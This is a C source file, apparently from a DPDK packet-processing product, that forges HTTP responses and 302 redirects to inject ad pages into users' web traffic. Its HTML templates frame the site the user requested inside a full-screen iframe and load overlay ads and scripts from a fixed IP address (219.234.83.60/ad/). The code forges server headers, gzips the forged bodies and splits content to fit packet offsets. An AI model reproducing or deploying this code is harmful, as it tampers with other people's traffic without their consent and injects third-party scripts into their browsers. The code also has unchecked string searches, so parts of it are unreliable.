/*=============================================================================
#       COPYRIGHT NOTICE
#       Copyright (c) 2015
#       All rights reserved
#
#       @author       :shan
#       @name         :Sam Liu
#       @file         :/home/shan/work/rose/src/test-1/template\packet_http.c
#       @date         :2015/09/19 18:30
#       @algorithm    :
=============================================================================*/

// http get header
//*****************************************************************************
//  sample code:
//  GET /test.html HTTP/1.1
//  Host: vlinux
//  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
//  Accept-Language: zh-cn
//  Connection: keep-alive
//  Accept-Encoding: gzip, deflate
//  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3
// * ***************************************************************************/
//
// ascii code:
// HTTP_GET "/test.html" HTTP_ONE_SPACE HTTP_VERSION HTTP_CRLF
// HTTP_HOST_HEAD "www.bai.com" HTTP_CRLF
// HTTP_ACCEPT HTTP_CRLF
// HTTP_ACCEPT_LANGUAGE HTTP_CRLF
// HTTP_CONNECTION HTTP_CRLF
// HTTP_ACCEPT_ENCODING HTTP_CRLF
// HTTP_USER_AGENT HTTP_CRLF
// HTTP_CRLF
//*****************************************************************************
#include "boots.h"
#include "packet_http.h"
#include "rte_memcpy.h"
#include "bts_debug.h"
#include  "gzip.h"
#include  "rte_cycles.h"
//#define DEBUG
#ifdef  DEBUG   
#define debug(fmt,args...)  printf ("func(%s), line(%d)"fmt"\n" ,__FUNCTION__, __LINE__, ##args)
#else   
#define debug(fmt,args...)   
#endif  /* DEBUG */ 


http_body_t *http_body = NULL;

#define HTTP_ONE_SPACE " "
#define HTTP_FOUR_SPACE HTTP_ONE_SPACE HTTP_ONE_SPACE HTTP_ONE_SPACE HTTP_ONE_SPACE
#define HTTP_CRLF                   "\r\n"
#define HTTP_GET                    "GET "
#define HTTP_VERSION                "HTTP/1.1"
#define HTTP_HOST_HEAD              "Host: "
#define HTTP_ACCEPT                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
#define HTTP_ACCEPT_LANGUAGE        "Accept-Language: zh-cn"
#define HTTP_CONNECTION             "Connection: close"
#define HTTP_ACCEPT_ENCODING        "Accept-Encoding: gzip, deflate"
#define HTTP_USER_AGENT             "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"


#define HTTP_RESPONSE_OK            "200 OK"
#define HTTP_KEEP_ALIVE             "Keep-Alive: timeout=60,max=199"
#define HTTP_VARY                   "Vary: Accept-Encoding"
#define HTTP_CONTENT_ENCODING       "Content-Encoding: gzip"
#define HTTP_CONTENT_TYPE           "Content-Type: text/html"
#define HTTP_SERVER                 "Server: Embedthis-http"
#define HTTP_DATA_HEAD              "Date: "
#define HTTP_ETAG                   "ETag:60c03-521-55f6e127"
#define HTTP_CONTENT_LENGTH_HEAD    "Content-Length: "
#define HTTP_LAST_MODIFIED_HEAD     "Last-Modified: "
#define HTTP_ACCEPT_RANGES          "Accept-Ranges: bytes"



// http response
//*****************************************************************************
// sample code :
// HTTP/1.1 200 OK
// Keep-Alive: timeout=60, max=199
// Content-Type: text/html
// Server: Embedthis-http
// Date: Mon, 14 Sep 2015 15:02:34 GMT
// ETag: "60c03-521-55f6e127"
// Content-Length: 1313
// Last-Modified: Mon, 14 Sep 2015 15:00:55 GMT
// Connection: Keep-Alive
// Accept-Ranges: bytes
// 
// <!DOCTYPE HTML>
// <html>
//     <head>
//         <meta charset="utf-8">
//         <title></title>
//         <script>
//             d=document;
//             function u(){
//             var f = "http://www.taobao.com";
//             d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'&')+'_t=t';
//             }
// 
//             setTimeout(function(){d.getElementById("x").style.display='block';}, 2000);     
// 
//             function c(){
//             x.style.display="none"
//             }
// 
//         </script>
//         <style>
//             body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}
//             a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}
//             #x{position:absolute;z-index:2;right:18px;bottom:0px;width:300px;height:250px}
//             #i{display:block; position:absolute; z-index:1; width:100%; height:100%}
//         </style>
//     </head>
//     <body onLoad=u()>
//         <div id=i>
//             <iframe id=m frameborder=0 width=100% height=100%></iframe>
//         </div>
//         <div id=x>
//             <iframe src="http://www.121zou.com/speed.html" width=300 height=250 scrolling=no frameborder=0></iframe>
//         </div>
// 
//     </body>
// </html>
//********************************************************************************
//
// response head acscii code:
// HTTP_VERSION HTTP_ONE_SPACE HTTP_RESPONSE_OK HTTP_CRLF
// HTTP_KEEP_ALIVE HTTP_CRLF
// HTTP_CONTENT_TYPE HTTP_CRLF
// HTTP_SERVER HTTP_CRLF
// HTTP_DATA_HEAD "Mon, 14 Sep 2015 15:02:34 GMT" HTTP_CRLF
// HTTP_ETAG HTTP_CRLF
// HTTP_CONTENT_LENGTH_HEAD "1313" HTTP_CRLF
// HTTP_LAST_MODIFIED_HEAD "Mon, 14 Sep 2015 15:00:55 GMT" HTTP_CRLF
// HTTP_CONNECTION HTTP_CRLF
// HTTP_ACCEPT_RANGES HTTP_CRLF
//********************************************************************************/




    
    




/* http get  head template 1*/
char *http_head_get1 = 
    HTTP_GET; 
char *http_head_get2 = "/test.html"; 
char *http_head_get3 = 
    HTTP_ONE_SPACE HTTP_VERSION HTTP_CRLF
    HTTP_HOST_HEAD; 
char *http_head_get4 = "www.bai.com"; 
char *http_head_get5 = 
    HTTP_CRLF
    HTTP_ACCEPT HTTP_CRLF
    HTTP_ACCEPT_LANGUAGE HTTP_CRLF
    HTTP_CONNECTION HTTP_CRLF
    HTTP_ACCEPT_ENCODING HTTP_CRLF
    HTTP_USER_AGENT HTTP_CRLF
    HTTP_CRLF;

/* http response ok template 1*/
char *http_head_response1=
    HTTP_VERSION HTTP_ONE_SPACE HTTP_RESPONSE_OK HTTP_CRLF
    HTTP_SERVER HTTP_CRLF
    HTTP_KEEP_ALIVE HTTP_CRLF
    HTTP_CONTENT_TYPE HTTP_CRLF
    HTTP_DATA_HEAD;

//    HTTP_VARY HTTP_CRLF
//    HTTP_CONTENT_ENCODING HTTP_CRLF

char *http_head_response2= "Mon, 14 Sep 2015 15:02:34 GMT";
char *http_head_response3=  \
    HTTP_CRLF \
    HTTP_ETAG  \
    HTTP_CRLF \
    HTTP_CONTENT_LENGTH_HEAD;
    
char *http_head_response4= "1313";
char *http_head_response5=
    HTTP_CRLF
    HTTP_LAST_MODIFIED_HEAD;
    
char *http_head_response6= "Mon, 14 Sep 2015 15:00:55 GMT"; 
char *http_head_response7=
    HTTP_CRLF
    HTTP_CONNECTION HTTP_CRLF
    HTTP_ACCEPT_RANGES HTTP_CRLF
    HTTP_CRLF;




// http response template 2
// HTTP/1.1 200 OK
// Date: Sat, 26 Sep 2015 08:34:03 GMT
// Server: Apache/2.4.10 (Unix)
// Last-Modified: Sat, 26 Sep 2015 08:32:19 GMT
// ETag: "6ae-520a24d67eac0"
// Accept-Ranges: bytes
// Content-Length: 1710
// Keep-Alive: timeout=5, max=100
// Connection: Keep-Alive
// Content-Type: text/html
//
// <!DOCTYPE HTML>
// <html>
//     <head>
//         <meta name="viewport" content="width=device-width, minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
//         <title></title>
//         <style>
//             body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}
//             a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#fff;color:#333; opacity:.8;z-index:3;right:2px;top:50%;margin-top:-10px;line-height:20px;text-align:center;width:20px;font-size:14px}
//             #x{position:fixed;z-index:2;bottom:0px;width:100%;height:60px}
//             #i{display:block; position:absolute; z-index:1; width:100%; height:100%}
//         </style>
//     </head>
//     <body style='background-color:transparent; margin:0px; height:100%'>
//         <div id=i>
//             <iframe id='m' name='m' width='100%' height='100%' frameborder='0'  ></iframe>
//         </div>
//         <div id=x style='position:fixed;z-index:2;right:0px;bottom:-1px;width:100%;height:60px'>
//             <a onClick='x.style.display="none"'>X</a>
//             <iframe src="http://www.121zou.com/adm.html" width=100% height=60 scrolling=no frameborder=0 style='border:0px none;display:block'></iframe>
//         </div>
//         <script>
//             (function () {
//             var d = document;
//             var f = "http://wap.hao123.com";
//             var ua = navigator.userAgent.toLowerCase();
//             var im = d.getElementById("m");
//             im.src = f + (f.indexOf("&") < 0 ? '?' : '&') + '_t=t';
//             if (ua.indexOf("iphone") > 0) {
//             im.width=window.innerWidth;
//             im.scrolling="no";
//             };    
//             })();
//         </script>
//
//     </body>
// </html>


http_body_t default_http_body[AD_TEMPLATE_MAX] = 
{
    {
        .name = "pc.html",
        .head = 
            "<!DOCTYPE HTML>\n"
            "<html>\n"
            "<head>\n"
            "<meta charset=\"utf-8\">\n"
            "<title></title>\n"
            "<script>\n"
            "d=document;\n"
            "function u(){\n"
            "var f = \"",
        .url =
            "www.taobao.com",
        .tail =
            "\";\n"
            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_tTI=tTI\';\n"
            "}\n"
            "</script>\n"
            "<style>\n"
            "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
            "a{cursor:pointer;display:block;position:absolute;border:1px;border-radius:1em;background-color:#555;color:#eee;z-index:3;right:5px;top:5px;line-height:20px;text-align:center;width:20px;font-size:10px}\n"
            "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
            "</style>\n"
            "</head>\n"
            "<body onLoad=u()>\n"
            "<div id=i>\n"
            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
            "</div>\n"
            "<script type=\"text/javascript\" src=\"http://219.234.83.60/ad/ad.php\"></script>\n"
            "</body>\n"
            "</html>\n"
            "\n",
    },
#if 1
    {
        .name = "mobile.html",
        .head = 
            "<!DOCTYPE HTML>\n"
            "<html>\n"
            "<head>\n"
            "<meta name=\"viewport\" content=\"width=device-width, minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\"/>\n"
            "<style>\n"
            "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
            "#i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
            "</style>\n"
            "</head>\n"
            "<body style=\'background-color:transparent; margin:0px; height:100%\'>\n"
            "<script src=\"http://219.234.83.60/ad/mobile.js\" language=\"JavaScript\"></script>\n"
            "<div id=i>\n"
            "<iframe id=\'m\' name=\'m\' width=\'100%\' height=\'100%\' frameborder=\'0\'  ></iframe>\n"
            "</div>\n"
            "<script>\n"
            "(function () {\n"
            "var d = document;\n"
            "var f = \"",
        .url =
            "http://wap.hao123.com",
        .tail =
            "\";\n"
            "var ua = navigator.userAgent.toLowerCase();\n"
            "var im = d.getElementById(\"m\");\n"
            "im.src = f + (f.indexOf(\"&\") < 0 ? \'?\' : \'&\') + \'_tTI=tTI\';\n"
            "if (ua.indexOf(\"iphone\") > 0) {\n"
            "im.width=window.innerWidth;\n"
            "im.scrolling=\"no\";\n"
            "};\n"
            "})();\n"
            "</script>\n"
            "\n"
            "</body>\n"
            "</html>\n",
    },
#else
    {
        .name = "mobile.html",
        .head = 
            "<!DOCTYPE HTML>\n"
            "<html>\n"
            "    <head>\n"
            "        <meta name=\"viewport\" content=\"width=device-width, minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\"/>\n"
            "        <title></title>\n"
            "        <style>\n"
            "            body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
            "            a{cursor:pointer;display:block;position:relative;border:1px;border-radius:1em;background-color:#fff;color:#333; opacity:.8;z-index:3;right:2px;top:50%;margin-top:-20px;margin-left:95%;line-height:20px;text-align:center;width:20px;font-size:14px}\n"
            "            #x{z-index:2;bottom:-1px;width:100%;height:80px;right:0px;}\n"
            "            #i{display:block; position:absolute; z-index:1; width:100%; height:100%}\n"
            "        </style>\n"
            "    </head>\n"
            "    <body style=\'background-color:transparent; margin:0px; height:100%\'>\n"
            "        <div id=x>\n"
            "            <a onClick=\'x.style.display=\"none\"\'>X</a>\n"
            "            <iframe src=\"http://219.234.83.60/ad/mobile.html\" width=100% height=60 scrolling=no frameborder=0 style=\'border:0px none;display:block\'></iframe>\n"
            "        </div>\n"
            "        <div id=i>\n"
            "            <iframe id=\'m\' name=\'m\' width=\'100%\' height=\'100%\' frameborder=\'0\'  ></iframe>\n"
            "        </div>\n"
            "        <script>\n"
            "            (function () {\n"
            "            var d = document;\n"
            "            var f = \"",
        .url =
            "http://wap.hao123.com",
        .tail =
            "\";\n"
            "            var ua = navigator.userAgent.toLowerCase();\n"
            "            var im = d.getElementById(\"m\");\n"
            "            im.src = f + (f.indexOf(\"&\") < 0 ? \'?\' : \'&\') + \'_t=t\';\n"
            "            if (ua.indexOf(\"iphone\") > 0) {\n"
            "            im.width=window.innerWidth;\n"
            "            im.scrolling=\"no\";\n"
            "            };\n"
            "            })();\n"
            "        </script>\n"
            "\n"
            "    </body>\n"
            "</html>\n",
    },
#endif
};

uint8_t send_mode = ADT_SEND_MULTI;
berr adt_get_send(uint8_t *send)
{
    if ( NULL == send )
    {
        return E_PARAM;
    }

    *send = send_mode;
    return E_SUCCESS;
}

berr adt_send_set(adt_send_em send)
{
    if ( send == ADT_SEND_NULL )
    {
        return E_PARAM;
    }
    send_mode = (uint8_t)send;
    return E_SUCCESS;
}

bool adt_send_is_single(void)
{
    if(ADT_SEND_SINGLE == send_mode )
    {
        return true;
    }

    return false;
}

bool adt_send_is_multi(void)
{
    if(ADT_SEND_MULTI == send_mode )
    {
        return true;
    }

    return false;
}

uint16_t
http_content_len_get(hytag_t *hytag)
{
    uint16_t len = 0;
    len += http_body[hytag->template].head_len;//strlen(http_body[hytag->template].head);    
    len += hytag->url_len;
    len += http_body[hytag->template].tail_len;//strlen(http_body[hytag->template].tail);
    return len;
}

berr ads_gzip_and_fill_content( char *buf, uint16_t *out_len, hytag_t *hytag)
{
    size_t len = 0;
    char * in = NULL;
    unsigned long outlen = 0;
    char *out = NULL;
    int rv = 0;

    if ( NULL == buf || NULL == hytag )
    {
        BRET(E_PARAM);
    }

    len = strlen(http_body[hytag->template].head);
    len += hytag->url_len;
    len += strlen(http_body[hytag->template].tail);
    in = (char *)malloc(len);
    if ( NULL == in)
    {
        BRET(E_MEMORY);
    }
    memset(in, 0, len);

    len = 0;
    rte_memcpy(in + len, http_body[hytag->template].head, (size_t) strlen(http_body[hytag->template].head));
    len += strlen(http_body[hytag->template].head);

    rte_memcpy(in + len, hytag->url, (size_t) hytag->url_len);
    len += hytag->url_len;

    rte_memcpy(in + len, http_body[hytag->template].tail, (size_t) strlen(http_body[hytag->template].tail));
    len += strlen(http_body[hytag->template].tail);

    out = buf;
    outlen = len;
    /* gzip */
    rv  = gzcompress(in, (uLong)len, out, &outlen);
    if (rv < 0)
    {
        free(in);
        BRET(E_FAIL);
    }
    free(in);
    *out_len = (uint16_t) outlen;
    return E_SUCCESS;
}


#if 0

berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
{
    uint16_t len = 0;
    uint16_t content_len = 0;
    char content_buff[10] = {0};

    if ( NULL == buf || NULL == hytag )
    {
        BRET(E_PARAM);
    }

    if( adt_send_is_multi())
    {
        rte_memcpy(buf + len, http_head_response1, (size_t) strlen(http_head_response1));
        len += strlen(http_head_response1);

        rte_memcpy(buf + len, http_head_response2, (size_t) strlen(http_head_response2));
        len += strlen(http_head_response2);

        rte_memcpy(buf + len, http_head_response3, (size_t) strlen(http_head_response3));
        len += strlen(http_head_response3);

        /* get content length */
        content_len = http_content_len_get(hytag);
        hytag->content_len = content_len;
        debug("hytag->content_len(%d)", hytag->content_len);
        sprintf(content_buff, "%d", content_len);
        rte_memcpy(buf + len, content_buff, (size_t) strlen(content_buff));
        len += strlen(content_buff);


        rte_memcpy(buf + len, http_head_response5, (size_t) strlen(http_head_response5));
        len += strlen(http_head_response5);

        rte_memcpy(buf + len, http_head_response6, (size_t) strlen(http_head_response6));
        len += strlen(http_head_response6);

        rte_memcpy(buf + len, http_head_response7, (size_t) strlen(http_head_response7));
        len += strlen(http_head_response7);

        hytag->l5_len = len;
    }
    else
    {
        char gzip_buff[2048] = {0};
        uint16_t gzip_len = 0;
        if (ads_gzip_and_fill_content(gzip_buff, &gzip_len, hytag))
        {
            BRET(E_FAIL);
        }
        rte_memcpy(buf + len, http_head_response1, (size_t) strlen(http_head_response1));
        len += strlen(http_head_response1);

        rte_memcpy(buf + len, http_head_response2, (size_t) strlen(http_head_response2));
        len += strlen(http_head_response2);

        rte_memcpy(buf + len, http_head_response3, (size_t) strlen(http_head_response3));
        len += strlen(http_head_response3);

        /* get content length */
        hytag->content_len = gzip_len;
        debug("hytag->content_len(%d)", hytag->content_len);
        sprintf(content_buff, "%d", hytag->content_len);
        rte_memcpy(buf + len, content_buff, (size_t) strlen(content_buff));
        len += strlen(content_buff);


        rte_memcpy(buf + len, http_head_response5, (size_t) strlen(http_head_response5));
        len += strlen(http_head_response5);

        rte_memcpy(buf + len, http_head_response6, (size_t) strlen(http_head_response6));
        len += strlen(http_head_response6);

        rte_memcpy(buf + len, http_head_response7, (size_t) strlen(http_head_response7));
        len += strlen(http_head_response7);

        rte_memcpy(buf + len, gzip_buff, (size_t)gzip_len);
        len += gzip_len;

        hytag->l5_len = len;
    }

    return E_SUCCESS;
}
#else


#define HTTP_302_HEADER             "HTTP/1.1 302 Moved Temporarily\r\n"
#define HTTP_302_SERVER             "Server: Embedthis-http\r\n"
#define HTTP_302_LOCATION           "Location: "
#define HTTP_302_CONTENT_TYPE       "Content-Type: text/html\r\n"
#define HTTP_302_CONTENT_LENGTH     "Content-Length: 0\r\n"
#define HTTP_302_DATE               "Date: Mon, 14 Sep 2015 15:02:34 GMT\r\n"


berr ads_http_302_fill(char *buf, hytag_t *hytag, char *url)
{
    int len = 0;
    

    if ( NULL == buf || NULL == hytag )
    {
        BRET(E_PARAM);
    }

    //printf("%s.%d\n", __func__, __LINE__);
#if 1
    len += snprintf(buf+len, 2048-len, "%s%s%s%s\r\n%s%s%s", 
        HTTP_302_HEADER, HTTP_302_SERVER, 
        HTTP_302_LOCATION, url, HTTP_302_CONTENT_TYPE,
        HTTP_302_CONTENT_LENGTH, HTTP_302_DATE);
#endif
    //printf("%s.%d\n", __func__, __LINE__);
    if (len > 0)
    {
        hytag->l5_len = len;
    }
    else
    {
        hytag->l5_len = 0;
    }
    hytag->content_len = 0;
    return E_SUCCESS;
}





berr ads_http_ok_head_fill(char *buf, hytag_t *hytag)
{
    uint16_t len = 0;
    uint16_t content_len = 0;
    char content_buff[10] = {0};
    int  clen =0 ;
    
    if ( NULL == buf || NULL == hytag )
    {
        BRET(E_PARAM);
    }


    /* get content length */
    content_len = http_content_len_get(hytag);
    hytag->content_len = content_len;
#if 1
    //uint64_t pre, cur;
    //pre = rte_rdtsc();
 
    len += snprintf(buf+len, 2048-len, "%s%s%s%d%s%s%s", 
        http_head_response1, http_head_response2, 
        http_head_response3, content_len, http_head_response5,
        http_head_response6, http_head_response7);
    //cur = rte_rdtsc();


    //printf("===============================: %lu\n"  ,   cur-pre);

    
#else
        len += snprintf(buf+len, 2048-len, "%s", http_head_response1);
        len += snprintf(buf+len, 2048-len, "%s", http_head_response2);
        len += snprintf(buf+len, 2048-len, "%s", http_head_response3);
        len += snprintf(buf+len, 2048-len, "%d", content_len);
        len += snprintf(buf+len, 2048-len, "%s", http_head_response5);
        len += snprintf(buf+len, 2048-len, "%s", http_head_response6); 
        len += snprintf(buf+len, 2048-len, "%s", http_head_response7); 
#endif
        
       
/*
    len += snprintf(buf+len, 2048-len, "%s%s%s%d%s%s%s", 
        http_head_response1, http_head_response2, 
        http_head_response3, content_len, http_head_response5,
        http_head_response6, http_head_response7);*/
    if( adt_send_is_single())
    {
        len += snprintf(buf+len, 2048-len, "%s%s%s", 
        http_body[hytag->template].head, hytag->url, http_body[hytag->template].tail);                
    }
    hytag->l5_len = len;
    return E_SUCCESS;
}




#endif


berr ads_http_content_fill(char *buf, hytag_t *hytag)
{
    uint16_t len = 0;
    uint16_t content_len = 0;
    char *content_buff[10] = {0};
    char *head = http_body[hytag->template].head;
    char *url = hytag->url;
    char *tail = http_body[hytag->template].tail;

    int head_len = http_body[hytag->template].head_len;
    
    uint16_t start;
    uint16_t l;

    if ( NULL == buf || NULL == hytag )
    {
        BRET(E_PARAM);
    }

    debug("hytag->content_offset(%d), hytag->fill_len(%d), hytag->content_len(%d)", hytag->content_offset,
            hytag->fill_len, hytag->content_len);
    if ( hytag->content_offset + hytag->fill_len > hytag->content_len)
    {
        BRET(E_PARAM);
    }
    /* first seek the begin */
    /* start at the head segment */
    if ( hytag->content_offset < head_len)
    {
        debug("start(%d)", start);
        start = hytag->content_offset;
        /* seek the end */
        /* end at the head segment*/
        if ( hytag->content_offset + hytag->fill_len <= head_len)
        {
            l = hytag->fill_len;
            rte_memcpy(buf + len, &head[start], (size_t) l);
            len += l;
            debug("len(%d)", len);
        }
        else /* end at the url segment */
        if ( hytag->content_offset + hytag->fill_len <= head_len + hytag->url_len)
        {
            /* first segment at the head segment */
            l = head_len - hytag->content_offset;
            rte_memcpy(buf + len, &head[start], l);
            len += l;
            debug("len(%d)", len);

            /* second segment at the url segment */
            l = hytag->fill_len - len;
            rte_memcpy(buf + len, url, l);
            len += l;
            debug("len(%d)", len);
        }
        /* end at the tail segment */
        else
        {
            /* first segment at the head segment */
            l = head_len - hytag->content_offset;
            rte_memcpy(buf + len, &head[start], l);
            len += l;
            debug("len(%d)", len);

            /* second segment at the url segment */
            l = hytag->url_len;
            rte_memcpy(buf + len, url, l);
            len += l;
            debug("len(%d)", len);

            /* third segment at the tail segment */
            l = hytag->fill_len - len;
            rte_memcpy(buf + len, tail, l);
            len += l;
            debug("len(%d)", len);
        }
    }
    else /* start at the url segment */
    if ( hytag->content_offset < head_len + hytag->url_len)
    {
        start = hytag->content_offset - head_len;
        /* seek the end */
        /* end at the url segment */
        if ( hytag->content_offset + hytag->fill_len <= head_len + hytag->url_len)
        {
            /* first segment at the url segment */
            l = hytag->fill_len;
            rte_memcpy(buf + len, &url[start], l);
            len += l;
            debug("len(%d)", len);
        }
        /* end at the tail segment */
        else
        {
            /* first segment at the url segment */
            l = hytag->url_len - start ;
            rte_memcpy(buf + len, &url[start], l);
            len += l;
            debug("len(%d)", len);

            /* second segment at the tail segment */
            l = hytag->fill_len - len;
            rte_memcpy(buf + len, tail, l);
            len += l;
            debug("len(%d)", len);
        }
    }    /* start at the tial segment */
    else
    {
        start = hytag->content_offset - head_len - hytag->url_len;
        /* start at the tial segment */
        /* first segment at the tail segment */
        l = hytag->fill_len;
        rte_memcpy(buf + len, &tail[start], l);
        len += l;
        debug("len(%d)", len);
    }

    hytag->l5_len = len;
    debug("hytag->l5_len(%d), hytag->fill_len(%d)", hytag->l5_len, hytag->fill_len);
    return E_SUCCESS;
}

berr ads_template_fill(http_body_t *http_to, http_body_t *http_from)
{
    if ( NULL == http_to || NULL == http_from )
    {
        BRET(E_PARAM);
    }

    rte_memcpy(http_to->name, http_from->name, (size_t)strlen(http_from->name));
    rte_memcpy(http_to->head, http_from->head, (size_t)strlen(http_from->head));
    rte_memcpy(http_to->url,  http_from->url,  (size_t)strlen(http_from->url));
    rte_memcpy(http_to->tail, http_from->tail, (size_t)strlen(http_from->tail));
    http_to->head_len = (size_t)strlen(http_from->head);
    http_to->tail_len = (size_t)strlen(http_from->tail);
    
    return E_SUCCESS;
}

berr ads_template_default_load( http_body_t *http_body)
{
    int i;
    int rv;
    if ( NULL == http_body )
    {
        printf("%s %d http_body malloc failed\n", __func__, __LINE__);
        BRET(E_PARAM);
    }

    for ( i = 0; i < AD_TEMPLATE_MAX; i++ )
    {
        rv = ads_template_fill(&http_body[i], &default_http_body[i]);
        if ( rv )
        {
            printf("%s %d rv=%d\n", __func__, __LINE__, rv);
            return rv;
        }
    }

    return E_SUCCESS;
}

http_body_t *adt_get_http_body(void)
{
    return http_body;
}

berr adt_fill_template(ad_template_em template, const char *name, char * buff)
{
    http_body_t *http_to = NULL;
    char *head = NULL;
    size_t head_len = 0;
    char *url =  NULL;
    size_t url_len = 0;
    char *tail = NULL;
    size_t tail_len = 0;
    char *del = "var f = \"";
    char *url_del = "http://www.taobao.com";
    int i;

    http_to = &http_body[template];

    rte_memcpy(http_to->name, name, (size_t)strlen(name));
    
    head = strstr(buff, del);
    head += strlen(del);
    head_len = head - buff;
    debug("head:");
    for ( i = 0; i < head_len; i++ )
    {
        //printf("%c", buff[i]);
    }

    url =  strstr(head, url_del);
    url_len = strlen(url_del);
    debug("url:");
    for ( i = 0; i < url_len; i++ )
    {
       // printf("%c", buff[i + head_len]);
    }

    tail = buff + head_len + url_len;
    tail_len = strlen(buff) - head_len - url_len;
    debug("url:");
    for ( i = 0; i < tail_len; i++ )
    {
        //printf("%c", buff[i + head_len + url_len]);
    }

    memset(http_to, 0, sizeof(http_body_t));
    rte_memcpy(http_to->name, name, (size_t)strlen(name));
    rte_memcpy(http_to->head, buff, head_len);
    http_to->head_len = head_len;
    rte_memcpy(http_to->url,  url,  url_len);
    rte_memcpy(http_to->tail, tail, tail_len);
    http_to->tail_len = tail_len;

    i = template;
    debug("Template(%d):\n", i);
    debug("name(%d):%s\n",   (int)strlen(http_body[i].name), http_body[i].name);
    debug("head(%d):\n%s\n", (int)strlen(http_body[i].head),http_body[i].head);
    debug("url(%d):\n%s\n",  (int)strlen(http_body[i].url), http_body[i].url);
    debug("tail(%d):\n%s\n", (int)strlen(http_body[i].tail),http_body[i].tail);

    return E_SUCCESS;
}

berr adt_set(ad_template_em template, const char *dir_str)
{
    int ret;
    FILE *fp;
    long L;
    char *buff;
    size_t n,i;
    if ( NULL == dir_str )
    {
        return E_PARAM;
    }

    fp = fopen (dir_str, "rb" );
    if (fp==NULL) 
    {
        debug ("open error\n"); 
        return E_OPEN;
    }
    fseek (fp , 0 , SEEK_END);
    L = ftell (fp);
    rewind (fp);
    buff= (char*) malloc (sizeof(char)*L);
    if (buff == NULL) 
    {
        debug("alloc error\n"); 
        fclose (fp);
        return E_MEMORY;
    }
    n = fread (buff,1,L,fp);
    if (n != L) 
    {
        debug("read error\n");
        fclose (fp);
        return E_FAIL;
    }
    fclose (fp);
    for (i=0;i<n;i++) {
        //printf("%c",buff[i]);
    }

    /**/
    ret = adt_fill_template(template, dir_str, buff);
    if ( ret )
    {
        debug("adt_fill_template fail ret(%d)", ret);
        free (buff);
        return ret;
    }

    free (buff);

    return E_SUCCESS;
}

berr ads_template_init(void)
{
    int rv;
    int i;
    http_body = malloc(sizeof(http_body_t)*AD_TEMPLATE_MAX);
    if (NULL == http_body)
    {
        printf("%s %d http_body malloc failed\n", __func__, __LINE__);
        BRET(E_NULL);
    }

    memset(http_body, 0, sizeof(http_body_t)*AD_TEMPLATE_MAX);
    rv = ads_template_default_load(http_body);
    if (rv)
    {
        printf("%s %d rv=%d\n", __func__, __LINE__, rv);
        return rv;
    }

    for( i = 0; i < AD_TEMPLATE_MAX; i++ )
    {
        debug("Template(%d):\n", i);
        debug("name(%d):%s\n",   (int)strlen(http_body[i].name), http_body[i].name);
        debug("head(%d):\n%s\n", (int)strlen(http_body[i].head),http_body[i].head);
        debug("url(%d):\n%s\n",  (int)strlen(http_body[i].url), http_body[i].url);
        debug("tail(%d):\n%s\n", (int)strlen(http_body[i].tail),http_body[i].tail);
    }
    printf("ads template init success!\n");

    return E_SUCCESS;
}
